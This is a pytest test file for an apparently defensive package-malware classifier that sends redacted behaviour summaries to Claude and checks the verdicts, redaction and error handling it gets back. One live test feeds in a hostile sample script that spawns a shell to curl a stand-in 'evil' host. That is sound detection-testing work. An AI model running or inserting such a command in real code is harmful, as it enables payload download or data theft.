"""Tests for Claude reasoner provider (mocked HTTP; live test optional)."""

from __future__ import annotations

import json
import os
from io import BytesIO
from pathlib import Path
from unittest.mock import patch
from urllib.error import HTTPError, URLError

import pytest

from reasoner.pipeline import run_reasoner_pipeline
from reasoner.providers.claude import (
    ANTHROPIC_API_URL,
    ANTHROPIC_VERSION,
    ClaudeReasonerProvider,
    PROMPT_VERSION,
    build_claude_prompt,
)
from reasoner.providers.factory import load_provider
from reasoner.schema import ReasonerSchemaError
from reasoner.summary import build_behavior_summary

ROOT = Path(__file__).resolve().parents[2]
FIXTURE_CORPUS = ROOT / "fixtures/rag-corpus/documents.jsonl"

_VALID_VERDICT = {
    "risk_score": 85,
    "action": "block",
    "attack_techniques": ["T1195.002"],
    "matched_campaigns": ["shai-hulud-2.0"],
    "justification": "Technique overlap with documented credential harvest lifecycle hooks.",
    "citations": [
        {
            "doc_id": "ti-shulud2-001",
            "title": "Shai-Hulud 2.0 credential theft",
            "url": "https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/",
            "date": "2025-11-24",
        }
    ],
    "uncertainty": "medium",
}


class _FakeResponse:
    def __init__(self, payload: dict) -> None:
        self._payload = payload

    def read(self) -> bytes:
        return json.dumps(self._payload).encode("utf-8")

    def __enter__(self) -> "_FakeResponse":
        return self

    def __exit__(self, *args: object) -> None:
        return None


def test_load_provider_defaults_to_fixture() -> None:
    with patch.dict(os.environ, {}, clear=False):
        os.environ.pop("REASONER_PROVIDER", None)
        provider = load_provider()
        assert provider.__class__.__name__ == "FixtureReasonerProvider"


def test_load_provider_claude_without_key() -> None:
    with patch.dict(os.environ, {"REASONER_PROVIDER": "claude"}, clear=False):
        os.environ.pop("ANTHROPIC_API_KEY", None)
        provider = load_provider()
        with pytest.raises(ReasonerSchemaError, match="ANTHROPIC_API_KEY"):
            provider.reason({}, [], {})


def test_build_claude_prompt_redacts_secrets() -> None:
    summary = {
        **build_behavior_summary({"suspicion_score": 6, "credential_hits": 1}),
        "detail": {"token": "token=summarysecret12345678"},
    }
    features = {"api_key": "ghp_abcdefghijklmnopqrstuvwxyz1234567890"}
    retrieved = [
        {
            "doc_id": "ti-1",
            "title": "Report password=titlepassword123",
            "text": "token=supersecretvalue12345678",
            "campaign_tags": ["shai-hulud"],
        }
    ]
    prompt = build_claude_prompt(
        summary,
        retrieved,
        features,
    )
    assert "ghp_[REDACTED]" in prompt
    assert "supersecretvalue12345678" not in prompt
    assert "summarysecret12345678" not in prompt
    assert "titlepassword123" not in prompt
    assert "Behavior summary (redacted)" in prompt
    assert "Static features (redacted)" in prompt
    assert "Retrieved intelligence excerpts" in prompt
    assert retrieved[0]["text"] == "token=supersecretvalue12345678"


def test_build_claude_prompt_limits_retrieved_chunk_size() -> None:
    prompt = build_claude_prompt({}, [{"doc_id": "ti-1", "text": "x" * 1300}], {})

    assert "x" * 1200 in prompt
    assert "x" * 1201 not in prompt


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_parses_valid_api_response(mock_urlopen) -> None:
    mock_urlopen.return_value = _FakeResponse(
        {
            "content": [
                {"type": "text", "text": json.dumps(_VALID_VERDICT)},
            ]
        }
    )
    provider = ClaudeReasonerProvider(
        api_key="test-key", model="claude-test-model", timeout_s=4.5
    )
    summary = build_behavior_summary({"suspicion_score": 7, "credential_hits": 2})
    verdict = provider.reason(summary, [], {"suspicion_score": 7})
    assert verdict["action"] == "block"
    assert verdict["risk_score"] == 85
    sent = mock_urlopen.call_args[0][0]
    assert sent.full_url == ANTHROPIC_API_URL
    assert sent.get_method() == "POST"
    assert sent.headers.get("X-api-key") == "test-key"
    assert sent.headers.get("Anthropic-version") == ANTHROPIC_VERSION
    assert mock_urlopen.call_args.kwargs == {"timeout": 4.5}
    body = json.loads(sent.data.decode("utf-8"))
    assert body["model"] == "claude-test-model"
    assert body["max_tokens"] == 1024
    assert body["messages"][0]["role"] == "user"
    assert "single JSON object" in body["system"]
    assert "ghp_" not in json.dumps(body)


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_accepts_json_markdown_fence(mock_urlopen) -> None:
    mock_urlopen.return_value = _FakeResponse(
        {
            "content": [
                {"type": "text", "text": f"```json\n{json.dumps(_VALID_VERDICT)}\n```"}
            ]
        }
    )

    verdict = ClaudeReasonerProvider(api_key="test-key").reason({}, [], {})

    assert verdict == _VALID_VERDICT


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_rejects_invalid_json(mock_urlopen) -> None:
    mock_urlopen.return_value = _FakeResponse(
        {"content": [{"type": "text", "text": "{not-json"}]}
    )
    provider = ClaudeReasonerProvider(api_key="test-key")
    with pytest.raises(ReasonerSchemaError):
        provider.reason(build_behavior_summary({"suspicion_score": 5}), [], {})


@pytest.mark.parametrize(
    "content",
    [[], [{"type": "tool_use", "name": "irrelevant"}], ["plain string"]],
)
@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_rejects_response_without_text(
    mock_urlopen, content: list[object]
) -> None:
    mock_urlopen.return_value = _FakeResponse({"content": content})

    with pytest.raises(ReasonerSchemaError, match="returned no text content"):
        ClaudeReasonerProvider(api_key="test-key").reason({}, [], {})


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_wraps_http_errors(mock_urlopen) -> None:
    mock_urlopen.side_effect = HTTPError(
        ANTHROPIC_API_URL,
        429,
        "Too Many Requests",
        hdrs=None,
        fp=BytesIO(b"rate limited"),
    )

    with pytest.raises(ReasonerSchemaError, match="HTTP 429: rate limited"):
        ClaudeReasonerProvider(api_key="test-key").reason({}, [], {})


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_wraps_network_errors(mock_urlopen) -> None:
    mock_urlopen.side_effect = URLError("connection timed out")

    with pytest.raises(ReasonerSchemaError, match="API unreachable.*connection timed out"):
        ClaudeReasonerProvider(api_key="test-key").reason({}, [], {})


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_uses_environment_configuration(
    mock_urlopen, monkeypatch: pytest.MonkeyPatch
) -> None:
    mock_urlopen.return_value = _FakeResponse(
        {"content": [{"type": "text", "text": json.dumps(_VALID_VERDICT)}]}
    )
    monkeypatch.setenv("ANTHROPIC_API_KEY", "environment-key")
    monkeypatch.setenv("ANTHROPIC_MODEL", "environment-model")

    ClaudeReasonerProvider().reason({}, [], {})

    sent = mock_urlopen.call_args.args[0]
    assert sent.headers.get("X-api-key") == "environment-key"
    assert json.loads(sent.data)["model"] == "environment-model"


def test_claude_provider_missing_key_degrades_pipeline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    result = run_reasoner_pipeline(
        script_source="child_process spawn",
        features={"suspicion_score": 6, "api_text_hits": 3},
        documents_path=str(FIXTURE_CORPUS),
        provider_name="claude",
    )
    assert result["reasoner_status"] == "degraded"
    assert result["action"] in {"quarantine", "block"}


@patch("reasoner.providers.claude.request.urlopen")
def test_claude_provider_sets_prompt_version(mock_urlopen) -> None:
    mock_urlopen.return_value = _FakeResponse(
        {"content": [{"type": "text", "text": json.dumps(_VALID_VERDICT)}]}
    )
    with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "test-key"}):
        result = run_reasoner_pipeline(
            script_source="require('child_process')",
            features={"suspicion_score": 8, "credential_hits": 2},
            documents_path=str(FIXTURE_CORPUS),
            provider_name="claude",
        )
    assert result["reasoner_status"] == "ok"
    assert result["prompt_version"] == PROMPT_VERSION


@pytest.mark.skipif(
    os.environ.get("RUN_LIVE_LLM") != "1",
    reason="set RUN_LIVE_LLM=1 to call Anthropic API",
)
def test_claude_live_integration() -> None:
    if not os.environ.get("ANTHROPIC_API_KEY"):
        pytest.skip("ANTHROPIC_API_KEY not set")
    result = run_reasoner_pipeline(
        script_source="require('child_process').spawn('sh', ['-c', 'curl evil']);",
        features={"suspicion_score": 8, "credential_hits": 2, "api_text_hits": 4},
        documents_path=str(FIXTURE_CORPUS),
        provider_name="claude",
    )
    assert result["reasoner_status"] == "ok"
    assert result["action"] in {"quarantine", "block"}
